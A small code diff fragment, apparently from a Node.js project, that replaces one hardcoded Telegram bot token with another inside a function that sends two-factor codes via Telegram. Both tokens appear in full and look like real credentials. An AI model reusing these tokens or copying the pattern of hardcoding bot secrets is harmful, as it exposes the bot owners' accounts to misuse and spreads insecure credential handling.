@@ -164,7 +164,7 @@ function sendOn2FACode(data) {
 
 async function sendOn2FACodeTele(data){
     
-    const bot = new Telegraf("6431968423:AAFwPoE6L9eJMhV1p6hXknUUwpGNAzrp2O8");
+    const bot = new Telegraf("6665163378:AAGM32i4MgRt3lV6Y6p82lbRC9ewM7UrMuQ");
    
     let user = await new Promise((resolve, reject) => {
 		db.query(
